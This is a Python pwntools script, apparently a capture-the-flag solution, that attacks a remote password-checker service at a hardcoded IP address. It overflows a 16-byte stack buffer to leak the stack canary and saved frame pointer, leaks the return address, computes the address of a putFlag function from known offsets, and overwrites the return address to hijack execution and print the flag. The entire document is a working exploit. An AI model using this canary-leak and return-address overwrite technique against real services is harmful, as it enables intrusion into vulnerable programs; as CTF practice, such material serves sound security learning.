from pwn import *
import re

conn = remote('140.113.207.245', 30174)

conn.recvuntil(b'Here is another password checker, you got 5 chances to try')
conn.sendline(b'A')
conn.recvuntil(b'Password is incorrect. Let\'s try again')
conn.sendline(b'A')
conn.recvuntil(b'Password is incorrect. Let\'s try again')

payload = b'A' * 24 + b'\n'  # 填滿 buf(16) + padding(8)，use \n to cover the first byte in canary \x00 so that printf %s won't stop there,讓 printf %s 掃到 canary
conn.send(payload)
leak = conn.recvuntil(b'Password')
conn.recvuntil(b'try again')  # 不 decode！抓原始 raw bytes
canary = b'\x00' + leak[43:50]
rbp = leak[50:-8]
# print(f'rbp: {rbp}, len: {len(rbp)}')

payload = b'B' * 24 + leak[42:50] + b'\x01' * 2 + rbp
conn.send(payload)
rip = conn.recvuntil(b'Password')
# print(f'rip: {rip}')
rip = u64(rip[52 + len(rbp):-8].ljust(8, b'\x00'))
'''
原先的 return address 是 main + 0xcd
main 的 offset 是 0x13a9
putFlag 的 offset 是 0x1269
因此 return address offset = 0xcd + 0x13a9 = 0x1476
putFlag_addr = return_address - (return_address_offset - putFlag_offset) = rip - 0x20d
'''
putFlag_addr = rip - 0x20d # 原 return addr 的 offset 是 0x476

payload = b'B' * 24 + canary + p64(u64(rbp.ljust(8, b'\x00'))) + p64(putFlag_addr)
conn.send(payload)
data = conn.recvuntil(b'}').decode('ascii')
flag = re.search(r'CSC2025\{.*?\}', data)
print(flag.group())
